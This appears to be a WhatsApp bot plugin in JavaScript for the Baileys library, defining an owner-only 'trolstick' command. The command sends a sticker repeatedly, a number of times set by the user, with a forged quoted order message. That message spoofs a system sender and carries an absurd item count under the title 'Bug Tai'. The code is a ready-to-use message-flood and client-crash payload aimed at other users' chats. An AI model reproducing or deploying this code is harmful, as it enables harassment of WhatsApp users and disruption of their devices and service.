const { MessageType } = require('@adiwajshing/baileys')
let fs = require('fs')
let handler  = async (m, { conn, text, args }) => {
	  for (let i = 0; i < args[0]; i++) {
	  result = fs.readFileSync(`./plugins/temp/leh`)
	  let tromli = {
	    quoted: {

	    key: {

	    participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})
	    },
	    message: {
	    orderMessage: {
	    itemCount: 9999999999999,
	    status: 1,
	    surface: 10,
	    orderTitle: 'Bug Tai',
	    sellerJid: '0@s.whatsapp.net'
	    }}}}

	      conn.sendMessage(m.chat, tromli, result, MessageType.sticker, {
	      quoted: m
	        })
	        }
	    }

	        handler.help = ['trolstick <brp>?']

	        handler.tags = ['owner']

	        handler.command = /^trolstick/i
	        handler.owner = true
	        handler.mods = false
	        handler.premium = false
	        handler.group = false
	        handler.private = false

	        handler.admin = false
	        handler.botAdmin = false

	        handler.fail = null

	        module.exports = handler
	     